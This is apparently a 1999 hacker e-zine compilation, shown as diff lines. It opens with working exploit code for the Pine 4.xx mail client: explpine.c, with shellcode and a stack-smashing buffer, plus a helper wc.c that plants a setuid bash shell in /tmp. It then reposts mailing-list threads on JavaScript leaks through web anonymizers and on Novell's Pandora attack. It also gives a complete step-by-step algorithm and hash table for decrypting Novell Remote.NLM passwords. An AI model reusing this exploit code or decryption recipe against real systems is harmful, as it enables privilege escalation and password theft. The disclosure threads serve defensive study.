+Put wc.c in /tmp and compile : gcc wc.c -o wc next you must compile
+explpine.c (-o explpine or change in wc.c [ killall -9 explpine ] )
+run this ...
+Send some mail to -luser- and wait wait wait ...
+
+
+-------------------------- explpine.c ----------------------------------------
+
+/* UNOFFICIAL exploit for Pine 4.xx                                       */
+/* Ripped from two txts ... lcamtuf's and Aleph1's :-)                    */
+/* by z33d -- z33d@lighting.ml.org                                        */
+/* if this doesn't work ,you will try with GDB-the best debugger ;-)      */
+/* because we don't know where will be this bufor in memory :-(           */
+/* I tested on RH 5.1 ( :-] )                                             */
+/* oh and you must first send some mail to -luser-                        */
+
+#include <sys/file.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+#define DEFAULT_DISTANCE 0xe98  
+#define DEFAULT_BUFFER_SIZE            600
+#define DEFAULT_EGG_SIZE               576  /* for lame: mod 4 = 0 !!!!!!!!! */
+#define NOP                            0x90
+#define LUSER "root"
+
+char shellcode[] =
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/tmp/wc";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) {
+  char *buff, *ptr, *egg , *bufor;
+  long *addr_ptr, addr;
+  int bsize=DEFAULT_BUFFER_SIZE;
+  int i, eggsize=DEFAULT_EGG_SIZE;
+  int a=0;
+  char s[100];
+  struct stat x;
+
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+  if (!(egg = malloc(eggsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+  if (!(bufor = malloc(bsize+eggsize))) {
+     printf("Can't allocate memory.\n");
+     exit(0);
+  }
+
+  addr = get_sp() - DEFAULT_DISTANCE;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  ptr = egg;
+  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
+    *(ptr++) = NOP;
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+  for (i = 0; i < eggsize ; i++)
+  bufor[i] = egg[i];
+  for (i=eggsize; i < eggsize+bsize+1 ; i++)
+  bufor[i] = buff[i-eggsize];
+
+  sprintf(s,"/var/spool/mail/%s",LUSER);
+  if (stat(s,&x)) exit(printf("Mailbox (%s) not found.\n",s));
+  sprintf(s,"/tmp/.%x.%x",(int)x.st_dev,(int)x.st_ino);
+  fchmod(i=open(s,O_RDWR|O_CREAT,0600),0666);
+  while (1) {
+    lseek(i,0,0);
+    write(i,bufor,bsize+eggsize);
+    ftruncate(i,bsize+eggsize);
+    fsync(i);
+    printf("Tieeeee %x\n",addr+DEFAULT_DISTANCE);
+    if (!a++) if (!flock(i,LOCK_EX)) printf("Got lock on %s.\n",s);
+      else printf("File %s already locked, wait...\n",s);
+    sleep(1);
+  }
+}
+--------------end of explpine.c----------------------------------------
+
+wc.c is a script which will be run by -luser-'s pine ...
+
+--------------wc.c------------------------
+
+#include <stdio.h>
+#define LUSER "z33d"
+void main()
+{
+  system("cp /bin/bash /tmp/mc666");
+  system("chgrp "LUSER" /tmp/mc666");
+  system("chmod +s /tmp/mc666");
+  system("/usr/bin/killall -9 explpine");
+  putenv("TERM=linux");
+  execl("/usr/bin/pine","pine",0);
+}
+
+-------------end of wc.c--------------------
+
+That's all ....
+
+Sayonara +
+
+*******************************************************************************
+
+Z 33d email : z33d@lighting.ml.org www : z33d.lighting.ml.org or
+www.kki.net.pl/~phoneeat
+
+Jesli nie istnieje racjonalna strategia optymalna , optymalna strategia
+jest strategia losowa ...
+                              - unknown -
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Serious security holes in Web anonymizing services :
+####################################################
+
+Hello,
+
+I found very serious security holes in all of the major
+anonymous Web surfing services (Anonymizer, Aixs, LPWA, etc.).
+These security holes allow a Web site to obtain information about
+users that the anonymizing services are suppose to be hiding.  This
+message provides complete details of the problem and offers
+a simple work-around for users until the security holes are
+fixed.
+
+The April 8th issue of the New York Times has an article
+by Peter H. Lewis in the Circuits section that describes
+various types of services that allow people to anonymously
+surf the Web.  The article is entitled "Internet Hide and
+Seek" and is available at the NY Times Web site:
+
+    http://www.nytimes.com/library/tech/99/04/circuits/articles/08pete.html
+
+(Note, this article can only viewed if you have a free
+NY Times Web account.)
+
+The three services described in the article are:
+
+    Anonymizer (http://www.anonymizer.com)
+    Bell Labs (http://www.bell-labs.com/project/lpwa)
+    Naval Research Laboratory (http://www.onion-router.net)
+
+In addition, I found a pointer to fourth service in a security
+newsgroup:
+
+    Aixs (http://aixs.net/aixs/)
+
+The best known of these services is the Anonymizer at
+www.anonymizer.com.  However all four services basically
+work in the same manner.  They are intended to hide
+information from a Web site when visited by a user.  The
+services prevent the Web site from seeing the IP address,
+host computer name, and cookies of a user.  All the services act
+as proxies fetching pages from Web sites instead of users
+going directly to Web sites.  The services make the promise
+that they don't pass private information along to
+Web sites.  They also do no logging of Web sites that
+have been visited.
+
+After reading the article, I was curious to find out how well
+each of these services worked.  In particular, I wanted to
+know if it would be possible for a Web site to
+defeat any of these systems.  Unfortunately, with less
+than an hour's worth of work, I was able to get all four
+systems to fail when using Netscape 4.5.
+
+The most alarming failures occurred with the Anonymizer and Aixs
+systems.  With the same small HTML page I was able
+to quietly turn off the anonymzing feature in both services.
+Once this page runs, it quickly redirects to a regular
+Web page of the Web site.  Because the browser is no
+longer in anonymous mode, IP addresses and cookies
+are again sent from the user's browser to all Web servers.
+This security hole exists because both services fail to properly
+strip out embedded JavaScript code in all cases from HTML
+pages.
+
+With the Bell Labs and NRL systems I found a different
+failure.  With a simple JavaScript expression I was
+able to query the IP address and host name of the
+browser computer.  The query was done by calling the
+Java InetAddress class using the LiveConnect feature
+of Netscape Navigator.  Once JavaScript has this
+information, it can easily be transmitted it back to a
+Web server as part of a URL.
+
+A demo on the use of Java InetAddress class to fetch
+the browser IP address and host name can be found at:
+
+   http://www.tiac.net/users/smiths/js/livecon/index.htm
+
+If you are a user of any these services, I highly recommend
+that you turn off JavaScript, Java, and ActiveX
+controls in your browser before surfing the Web.
+This simple precaution will prevent any leaks of
+your IP address or cookies.  I will be notifying all 4 vendors
+about these security holes and hopefully this same recommendation
+will be given to all users.
+
+If you have any questions or comments, please send them via Email.
+
+Richard M. Smith
+smiths@tiac.net
+
+--
+ Patrick Oonk -    http://patrick.mypage.org/  - patrick@pine.nl
+ Pine Internet B.V.           Consultancy, installatie en beheer
+ Tel: +31-70-3111010 - Fax: +31-70-3111011 - http://www.pine.nl/
+ -- Pine Security Digest - http://security.pine.nl/ (Dutch) ----
+ Excuse of the day: bugs in the RAID
+
+
+
+
+
+
+On Tue, Apr 13, 1999 at 08:14:49PM +0200, Patrick Oonk wrote:
+> From: "Richard M. Smith" <smiths@tiac.net>
+> Subject: Serious security holes in Web anonymizing services
+> Date: Sun, 11 Apr 1999 19:23:25 -0400
+> Newsgroups: comp.security.misc
+> Organization: The Internet Access Company, Inc.
+>
+> I found very serious security holes in all of the major
+> anonymous Web surfing services (Anonymizer, Aixs, LPWA, etc.).
+> These security holes allow a Web site to obtain information about
+> users that the anonymizing services are suppose to be hiding.  This
+> message provides complete details of the problem and offers
+> a simple work-around for users until the security holes are
+> fixed.
+
+(...)
+
+>
+> With the Bell Labs and NRL systems I found a different
+> failure.  With a simple JavaScript expression I was
+> able to query the IP address and host name of the
+> browser computer.  The query was done by calling the
+> Java InetAddress class using the LiveConnect feature
+> of Netscape Navigator.  Once JavaScript has this
+> information, it can easily be transmitted it back to a
+> Web server as part of a URL.
+>
+> A demo on the use of Java InetAddress class to fetch
+> the browser IP address and host name can be found at:
+>
+>    http://www.tiac.net/users/smiths/js/livecon/index.htm
+>
+> If you are a user of any these services, I highly recommend
+> that you turn off JavaScript, Java, and ActiveX
+> controls in your browser before surfing the Web.
+> This simple precaution will prevent any leaks of
+> your IP address or cookies.  I will be notifying all 4 vendors
+> about these security holes and hopefully this same recommendation
+> will be given to all users.
+>
+
+I'm sorry, but this just isn't a "hole" or "failure" in Onion Routing (which
+I work on) or any other anonymizing service. It's a problem with
+Javascript/Java and ActiveX. The fact is that browsers don't consider IP
+addresses as private information, and IMO this needs to change, or at least
+be optional.
+
+I'll speak about Onion Routing since I don't know the Bell Labs system as
+well. Onion Routing is designed to prevent traffic analysis. It is _not_
+designed to prevent the client and server from communicating in any
+particular fashion they choose. If the client wants to give its IP, name,
+phone number, height, weight, or eye color to the server, that's its
+business, it is not the business of Onion Routing. There are many cases
+where one might want to share a real identity, or some pseudo-identity, with
+a server, but not want anyone in between to know you were talking to that
+server. Often this same functionality also prevents the server from knowing
+anything about the client, but that is not a requirement of the system.
+
+Onion Routing provides a network strongly resistant to traffic analysis in
+the face of formidable attacks. It prevents anyone other than A and B from
+knowing that A and B are communicating. It has nothing to do with what
+information A shares with B.
+
+That said, the Javascript thing is pretty annoying. This problem doesn't
+affect just anonymizing-service users, it also affects anyone behind a
+firewall or any sort of "internal network structure hiding" scheme. The fact
+that it's transparent to the user is a major issue. This is one to take up
+with the browser makers.
+
+It would be possible to use an HTTP proxy to filter the Javascript, of
+course, and that could be built into the Onion Routing proxy, but that's
+only a band-aid hack, and doesn't solve the core problem.
+
+Regards,
+Jeremey.
+--
+Jeremey Barrett <jeremey@terisa.com>
+GPG fingerprint = 7BB2 E1F1 5559 3718 CE25 565A 8455 D60B 8FE8 B38F
+
+
+
+
+
+
+Sorry for the dual post, the first was html format.
+
+This is more of a browser/Java issue. This not only affects annon
+sevices but proxy/firewall services also!!!
+
+Toby Barrick
+
+Patrick Oonk wrote:
+>
+> From: "Richard M. Smith" <smiths@tiac.net>
+> Subject: Serious security holes in Web anonymizing services
+> Date: Sun, 11 Apr 1999 19:23:25 -0400
+> Newsgroups: comp.security.misc
+> Organization: The Internet Access Company, Inc.
+>
+> Hello,
+>
+> I found very serious security holes in all of the major
+> anonymous Web surfing services (Anonymizer, Aixs, LPWA, etc.).
+> These security holes allow a Web site to obtain information about
+> users that the anonymizing services are suppose to be hiding.  This
+> message provides complete details of the problem and offers
+> a simple work-around for users until the security holes are
+> fixed.
+>
+> The April 8th issue of the New York Times has an article
+> by Peter H. Lewis in the Circuits section that describes
+> various types of services that allow people to anonymously
+> surf the Web.  The article is entitled "Internet Hide and
+> Seek" and is available at the NY Times Web site:
+>
+>     http://www.nytimes.com/library/tech/99/04/circuits/articles/08pete.html
+>
+> (Note, this article can only viewed if you have a free
+> NY Times Web account.)
+>
+> The three services described in the article are:
+>
+>     Anonymizer (http://www.anonymizer.com)
+>     Bell Labs (http://www.bell-labs.com/project/lpwa)
+>     Naval Research Laboratory (http://www.onion-router.net)
+>
+> In addition, I found a pointer to fourth service in a security
+> newsgroup:
+>
+>     Aixs (http://aixs.net/aixs/)
+>
+> The best known of these services is the Anonymizer at
+> www.anonymizer.com.  However all four services basically
+> work in the same manner.  They are intended to hide
+> information from a Web site when visited by a user.  The
+> services prevent the Web site from seeing the IP address,
+> host computer name, and cookies of a user.  All the services act
+> as proxies fetching pages from Web sites instead of users
+> going directly to Web sites.  The services make the promise
+> that they don't pass private information along to
+> Web sites.  They also do no logging of Web sites that
+> have been visited.
+>
+> After reading the article, I was curious to find out how well
+> each of these services worked.  In particular, I wanted to
+> know if it would be possible for a Web site to
+> defeat any of these systems.  Unfortunately, with less
+> than an hour's worth of work, I was able to get all four
+> systems to fail when using Netscape 4.5.
+>
+> The most alarming failures occurred with the Anonymizer and Aixs
+> systems.  With the same small HTML page I was able
+> to quietly turn off the anonymzing feature in both services.
+> Once this page runs, it quickly redirects to a regular
+> Web page of the Web site.  Because the browser is no
+> longer in anonymous mode, IP addresses and cookies
+> are again sent from the user's browser to all Web servers.
+> This security hole exists because both services fail to properly
+> strip out embedded JavaScript code in all cases from HTML
+> pages.
+>
+> With the Bell Labs and NRL systems I found a different
+> failure.  With a simple JavaScript expression I was
+> able to query the IP address and host name of the
+> browser computer.  The query was done by calling the
+> Java InetAddress class using the LiveConnect feature
+> of Netscape Navigator.  Once JavaScript has this
+> information, it can easily be transmitted it back to a
+> Web server as part of a URL.
+>
+> A demo on the use of Java InetAddress class to fetch
+> the browser IP address and host name can be found at:
+>
+>    http://www.tiac.net/users/smiths/js/livecon/index.htm
+>
+> If you are a user of any these services, I highly recommend
+> that you turn off JavaScript, Java, and ActiveX
+> controls in your browser before surfing the Web.
+> This simple precaution will prevent any leaks of
+> your IP address or cookies.  I will be notifying all 4 vendors
+> about these security holes and hopefully this same recommendation
+> will be given to all users.
+>
+> If you have any questions or comments, please send them via Email.
+>
+> Richard M. Smith
+> smiths@tiac.net
+>
+> --
+>  Patrick Oonk -    http://patrick.mypage.org/  - patrick@pine.nl
+>  Pine Internet B.V.           Consultancy, installatie en beheer
+>  Tel: +31-70-3111010 - Fax: +31-70-3111011 - http://www.pine.nl/
+>  -- Pine Security Digest - http://security.pine.nl/ (Dutch) ----
+>  Excuse of the day: bugs in the RAID
+
+
+
+
+
+
+
+I am not sure it afects firewalls and proxy servers in some cases.
+
+Let's say you have a network and a firewall which links this network to
+the external world. In the anonymizer service, the proxy is OPTIONAL,
+that is, packets do not necessarily have to go trough the proxy. In a
+network-firewall case, packets MUST go trough the firewall. It's not
+phisically on logically possible that packets go around that. Therefore,
+the anonymizing service keeps still.
+
+I made these considerations based on what I know from computer networks.
+I may be absolutely wrong and if that is the case, please correct it.
+
+v0c.
+
+Toby Barrick wrote:
+>
+> Sorry for the dual post, the first was html format.
+>
+> This is more of a browser/Java issue. This not only affects annon
+> sevices but proxy/firewall services also!!!
+>
+> Toby Barrick
+>
+> Patrick Oonk wrote:
+> >
+> > From: "Richard M. Smith" <smiths@tiac.net>
+> > Subject: Serious security holes in Web anonymizing services
+> > Date: Sun, 11 Apr 1999 19:23:25 -0400
+> > Newsgroups: comp.security.misc
+> > Organization: The Internet Access Company, Inc.
+> >
+> > Hello,
+> >
+> > I found very serious security holes in all of the major
+> > anonymous Web surfing services (Anonymizer, Aixs, LPWA, etc.).
+> > These security holes allow a Web site to obtain information about
+> > users that the anonymizing services are suppose to be hiding.  This
+> > message provides complete details of the problem and offers
+> > a simple work-around for users until the security holes are
+> > fixed.
+> >
+> > The April 8th issue of the New York Times has an article
+> > by Peter H. Lewis in the Circuits section that describes
+> > various types of services that allow people to anonymously
+> > surf the Web.  The article is entitled "Internet Hide and
+> > Seek" and is available at the NY Times Web site:
+> >
+> >     http://www.nytimes.com/library/tech/99/04/circuits/articles/08pete.html
+> >
+> > (Note, this article can only viewed if you have a free
+> > NY Times Web account.)
+> >
+> > The three services described in the article are:
+> >
+> >     Anonymizer (http://www.anonymizer.com)
+> >     Bell Labs (http://www.bell-labs.com/project/lpwa)
+> >     Naval Research Laboratory (http://www.onion-router.net)
+> >
+> > In addition, I found a pointer to fourth service in a security
+> > newsgroup:
+> >
+> >     Aixs (http://aixs.net/aixs/)
+> >
+> > The best known of these services is the Anonymizer at
+> > www.anonymizer.com.  However all four services basically
+> > work in the same manner.  They are intended to hide
+> > information from a Web site when visited by a user.  The
+> > services prevent the Web site from seeing the IP address,
+> > host computer name, and cookies of a user.  All the services act
+> > as proxies fetching pages from Web sites instead of users
+> > going directly to Web sites.  The services make the promise
+> > that they don't pass private information along to
+> > Web sites.  They also do no logging of Web sites that
+> > have been visited.
+> >
+> > After reading the article, I was curious to find out how well
+> > each of these services worked.  In particular, I wanted to
+> > know if it would be possible for a Web site to
+> > defeat any of these systems.  Unfortunately, with less
+> > than an hour's worth of work, I was able to get all four
+> > systems to fail when using Netscape 4.5.
+> >
+> > The most alarming failures occurred with the Anonymizer and Aixs
+> > systems.  With the same small HTML page I was able
+> > to quietly turn off the anonymzing feature in both services.
+> > Once this page runs, it quickly redirects to a regular
+> > Web page of the Web site.  Because the browser is no
+> > longer in anonymous mode, IP addresses and cookies
+> > are again sent from the user's browser to all Web servers.
+> > This security hole exists because both services fail to properly
+> > strip out embedded JavaScript code in all cases from HTML
+> > pages.
+> >
+> > With the Bell Labs and NRL systems I found a different
+> > failure.  With a simple JavaScript expression I was
+> > able to query the IP address and host name of the
+> > browser computer.  The query was done by calling the
+> > Java InetAddress class using the LiveConnect feature
+> > of Netscape Navigator.  Once JavaScript has this
+> > information, it can easily be transmitted it back to a
+> > Web server as part of a URL.
+> >
+> > A demo on the use of Java InetAddress class to fetch
+> > the browser IP address and host name can be found at:
+> >
+> >    http://www.tiac.net/users/smiths/js/livecon/index.htm
+> >
+> > If you are a user of any these services, I highly recommend
+> > that you turn off JavaScript, Java, and ActiveX
+> > controls in your browser before surfing the Web.
+> > This simple precaution will prevent any leaks of
+> > your IP address or cookies.  I will be notifying all 4 vendors
+> > about these security holes and hopefully this same recommendation
+> > will be given to all users.
+> >
+> > If you have any questions or comments, please send them via Email.
+> >
+> > Richard M. Smith
+> > smiths@tiac.net
+> >
+> > --
+> >  Patrick Oonk -    http://patrick.mypage.org/  - patrick@pine.nl
+> >  Pine Internet B.V.           Consultancy, installatie en beheer
+> >  Tel: +31-70-3111010 - Fax: +31-70-3111011 - http://www.pine.nl/
+> >  -- Pine Security Digest - http://security.pine.nl/ (Dutch) ----
+> >  Excuse of the day: bugs in the RAID
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+New Novell Remote.NLM Password Decryption Alg : 
+###############################################
+
+I am providing this message in hopes that it will contribute to the
+general knowledge of others.  Please distribute this document fully
+intact, so people can learn the -entire- algorithm.
+
+- - - - - -
+
+Novell is known to use a one-way hash algorithm in their password
+encryption, so all captured encrypted passwords must be brute-forced,
+slowly and painfully.
+
+However, a few days ago, I cryptographically cracked Novell's Remote.NLM
+password encryption algorithm.  It is a very weak algorithm compared to
+what Novell has implemented in NDS, as it is instantaneously
+decryptable.
+
+RConsole password encryption is different from Remote.NLM password
+encryption because:
+
+1) Encrypted RConsole passwords are sent across the wire, via RConsole.
+Remote.NLM's encrypted passwords are generated at the server console by
+typing REMOTE ENCRYPT MyPass, and they are optionally stored in
+SYS:System\LDRemote.NCF.
+
+2) They use a different password encryption algorithm.  RConsole
+passwords are encrypted with information from the workstation that is
+currently running RConsole.  Remote.NLM passwords are encrypted with a
+time byte, one of 255 constants in a hash table, appended characters,
+some XORing, and bit-order separation.
+
+3) Encrypted RConsole passwords are locally obtained with a packet
+sniffer, but Remote.NLM passwords are remotely accessible to anyone with
+the ability to view SYS:System\LDRemote.NCF.
+
+The Remote.NLM passwords are decrypted using only five steps.  To
+encrypt, simply reverse the steps.  I don't know if this would be called
+a two-way hash algorithm, but I assume it is.
+
+The password will look something like this:
+  AF8CBBF48CA9955F5ADAFDADAA23
+
+ The structure of the password is as follows:
+  AF8CBBF48CA99 55F5ADAFDADAA - 23
+
+ The first section contains the low-order bits, and the second, the
+high-order bits.  23 is the time byte, which is decremented by the
+server once every two seconds, from FF to 02, then back up to FF, etc.
+
+Step 1)  Realign the low-order bits and high-order bits.
+ This is extremely simple to do.  The high-order bits are in order from
+the first character to the last, and so are the low-order bits.
+Example:
+Password: AF8CBBF48CA99 - 55F5ADAFDADAA,
+Output: 5A 5F F8 5C AB DB AF F4 D8 AC DA A9 A9
+At this point, ignore 5A 5F F8 5C, or the first four bytes.  They are
+appended somewhere during encryption, and decrypt to "%*@$".
+It was a TERRIBLE idea for Novell to implement those four characters
+into every single password, as those are what helped me rebuild their
+hash table from scratch.  Also, if the length of the password is 10, the
+password is automatically decryptable to nul.
+
+Step 2) Match each of the password characters (group of two hex
+characters) to the hash table below.  Use their position from the
+beginning of the table to determine the value of the pre-hash encrypted
+password.  Example: F4, the 8th character of the password, matches the
+hash table at 95.  This means that 95 is the pre-hash value of F4.
+Thus far, (ignoring the first four characters) the password was:
+AB DB AF F4 D8 AC DA A9 A9
+and now the password is:
+98 A0 9B 95 A1 9D A6 9C 9C
+
+Remote.NLM Hash Table
+
+    00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+
+00  5B 58 5E 5F 59 5C 5A 5D-73 70 76 77 71 74 72 75
+10  13 10 16 17 11 14 12 15-7B 78 7E 7F 79 7C 7A 7D
+20  53 50 56 57 51 54 52 55-03 00 06 07 01 04 02 05
+30  1B 18 1E 1F 19 1C 1A 1D-0B 08 0E 0F 09 0C 0A 0D
+40  2B 28 2E 2F 29 2C 2A 2D-63 60 66 67 61 64 62 65
+50  83 80 86 87 81 84 82 85-3B 38 3E 3F 39 3C 3A 3D
+60  8B 88 8E 8F 89 8C 8A 8D-33 30 36 37 31 34 32 35
+70  93 90 96 97 91 94 92 95-6B 68 6E 6F 69 6C 6A 6D
+80  9B 98 9E 9F 99 9C 9A 9D-A3 A0 A6 A7 A1 A4 A2 A5
+90  F3 F0 F6 F7 F1 F4 F2 F5-AB A8 AE AF A9 AC AA AD
+A0  DB D8 DE DF D9 DC DA DD-FB F8 FE FF F9 FC FA FD
+B0  23 20 26 27 21 24 22 25-B3 B0 B6 B7 B1 B4 B2 B5
+C0  CB C8 CE CF C9 CC CA CD-BB B8 BE BF B9 BC BA BD
+D0  C3 C0 C6 C7 C1 C4 C2 C5-D3 D0 D6 D7 D1 D4 D2 D5
+E0  43 40 46 47 41 44 42 45-E3 E0 E6 E7 E1 E4 E2 E5
+F0  4B 48 4E 4F 49 4C 4A 4D-EB E8 EE EF E9 EC EA ED
+
+Step 3) Subtract the length (the number of groups of hex characters,
+excluding the time character) of the full password from each encrypted
+password character.  Now you have the ACTUAL pre-hash encrypted
+password.  If the subtracted value is negative then simply continue from
+FF down to the negative value.  Example:  if the password character is
+at 04, and the length is 6, the value of the password character will be
+FF.
+The length is 13 (D in hex), so the password was:
+98 A0 9B 95 A1 9D A6 9C 9C
+and is now:
+8B 93 8E 88 94 90 99 8F 8F
+
+Step 4) Get the time var, in this situation 23 (hex), and subtract it
+from FF.  This new character is for use in Step 5.  Example:  FF-23=DC.
+
+Step 5) Finally, XOR each character (group of 2 hex characters) of the
+encrypted password with the new time character, and you now have the
+decrypted password!
+
+The password was:
+8B 93 8E 88 94 90 99 8F 8F  (before the XOR)
+
+Now, the decrypted password is:
+57 4F 52 54 48 4C 45 53 53
+"WORTHLESS"
+
+I used "worthless" because if I seventeen-year-old with almost NO
+experience in cryptography can crack an encryption algorithm, then under
+most circumstances the algorithm is ABSOLUTELY WORTHLESS!!!
+
+I have written a program in Pascal (oh well) which decrypts Remote.NLM
+passwords instantaneously.  I am unsure of the password length limits of
+the program because I just wrote it.  However, it has never failed to
+decrypt a password.  I have tested it on a password of around 50
+characters, and it worked flawlessly, so there shouldn't be anything to
+worry about regarding the length limit.
+
+It can decrypt any character, from 00 to FF, and it will display that
+value upon execution.
+
+The source of the program is attached.
+
+If you need help understanding this, or you wish to contribute to this
+document, feel free to e-mail me.
+
+TheRuiner
+dreamer@relia.net
+
+"Some OTHER operating systems suffer from weak password encryption."
+- A quote from Novell's course of Networking Technologies.
+
+
+`````````````````````````````````
+VOIR /underwayy3/docs/remote.zip`
+`````````````````````````````````
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Novell Pandora Hack :
+#####################
+
+On Mon, 12 Apr 1999, Jeremy M. Guthrie wrote:
+
+> I had a friend show me the Novell TID: 2941119 about what Novell calls the
+> "Pandora Hack".  I suggests patching Netware to at least SP5 and setting
+> client/server signatures to 3.  I was under the impression that the
+> signature fix did not take care of the issue.  Comments????  It looks like
+> Novell wants you to see the error messages... then figure out a
+> corrective action against the attacker.  Or I could be on crack.
+
+I thought crack ran on Unix...;-)
+
+There are two things you need to do to stop the Pandora attacks from
+succeeding - load up the correct DS.NLM (hence the SP5B fix), and have SET
+NCP PACKET SIGNATURE OPTION=3 somewhere before this NLM loads. Putting the
+SET statement at the beginning of either the STARTUP.NCF and AUTOEXEC.NCF
+is fine. I'd also recommend binding protocols to cards last.
+
+The client packet signature settings must be on at least 1 (which is the
+default) otherwise you will not be able to log in. This means proper
+protection from Pandora will involve updating any stone age client
+software.
+
+That error is supposed to be there anyway -- that was the original
+problem, you could bypass all of the signature stuff and NCP spoof your
+way onto the server with elevated privs.
+
+Yes the default out of the box settings on Netware 4.x leaves you
+vulnerable to attack. By default Netware 5 uses IP instead of IPX, but of
+course Novell's IP stack is susceptable to sequence prediction so you
+stand the same theoretical risk (Pandora is IPX-based only).
+
+Of course spoofing the source of a Pandora attack can have other effects
+with these security measures in place, since you could fill up the SYS
+volume (stopping all server processing) with "invalid security signature"
+messages. There is no "last message repeated 200,000 times" log entry in
+Netware....
+
+    Simple Nomad    //
+ thegnome@nmrc.org  //  ....no rest for the Wicca'd....
+    www.nmrc.org    //
+
+
+
+
+
+
+
+You can put a limit on the maximum size of the error log file (SYS$LOG.ERR)
+though..... This will stop it from filling the volume.
+
+Sam
+
+
+
+
+Of course spoofing the source of a Pandora attack can have other effects
+with these security measures in place, since you could fill up the SYS
+volume (stopping all server processing) with "invalid security signature"
+messages. There is no "last message repeated 200,000 times" log entry in
+Netware....
+
+
+
+
+
+
+Yes this is why the console log (and any other log files for that
+matter) should be redirected to a quota restricted directory or better
+yet another volume "var" perhaps.  Hmmm...what a concept.  While
+this is still less than ideal, it will at least minimize the impact.
+
+-Iain
+
+On 13 Apr 99, at 12:03, Simple Nomad wrote:
+
+Much stuff Cut.....
+
+> Of course spoofing the source of a Pandora attack can have other effects
+> with these security measures in place, since you could fill up the SYS
+> volume (stopping all server processing) with "invalid security signature"
+> messages. There is no "last message repeated 200,000 times" log entry in
+> Netware....
+>
+>     Simple Nomad    //
+>  thegnome@nmrc.org  //  ....no rest for the Wicca'd....
+>     www.nmrc.org    //
+
+
+*******************************************
+Iain P.C. Moffat
+College of Health Professions
+University of Florida
+E-mail:  ipm@ufl.edu
+Voice:   352.392.0965
+Fax:     352.392.6529
+*******************************************
+
+
+
+
+
+
+I just went through this extensively with Novell, up to the point of having
+the issue declared "CRITSIT" which is their highest level an incident can
+be raised to.
+
+By setting the server to reject incomplete NCP packets and those with bad
+lengths, and also setting the NCP packet signature level to 3 (all of these
+must be set in STARTUP.NCF, before DS.NLM loads...setting these in SERVMAN
+will add them into AUTOEXEC.NCF, and you must cut and paste them into
+STARTUP.NCF) you will effectively kill the exploit.  You will still see the
+utilization rise on the server if someone "attacks" the server, but that is
+merely the server rejecting the packet, and not processing it. (The server
+HAS to look at the packets coming to it...they are NCP (NetWare Core
+Protocol) packets, and to ignore them would effectively render the server
+useless.) All that can be done is to have the server reject it and not
+process it.
+
+The downside of this all is that the attacker doesn't have to be logged
+into the network, and there is no effective way to track the MAC address
+they are coming from, as the packets take on the MAC address of the spoofed
+connection. I would suspect thought that if you thought someone was
+attacking your servers, you could eventually figure out where that person
+is, and take appropriate administrative actions. But for Novell's part,
+there isn't much more one could expect them to do.
+
+Keep in mind that setting NCP packet signature to level 3 will prevent
+people using microsoft's client for NetWare from being able to log in.
+
+Sam
+
+
+
+
+
+
+
+"Jeremy M. Guthrie" <jguthrie@CINET.NET> on 04/12/99 11:37:18 AM
+
+Please respond to "Jeremy M. Guthrie" <jguthrie@CINET.NET>
+
+To:   BUGTRAQ@NETSPACE.ORG
+cc:    (bcc: Samuel A. Morris)
+Subject:  Novell Pandora Hack
+
+
+
+
+I had a friend show me the Novell TID: 2941119 about what Novell calls the
+"Pandora Hack".  I suggests patching Netware to at least SP5 and setting
+client/server signatures to 3.  I was under the impression that the
+signature fix did not take care of the issue.  Comments????  It looks like
+Novell wants you to see the error messages... then figure out a
+corrective action against the attacker.  Or I could be on crack.
+
+--
+
+Jeremy M. Guthrie
+Network Administrator
+Certified Novell Engineer
+Custom Internetworking      email:  jguthrie@cinet.net
+6404 Odana Rd.              Phone:  (608)-663-8000
+Madison, WI  53719          FAX:    (608)-276-6406
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Voila c'est fini, j'espere que cela vous aura ete profitable !!!!
+
+The blAck Hole
+
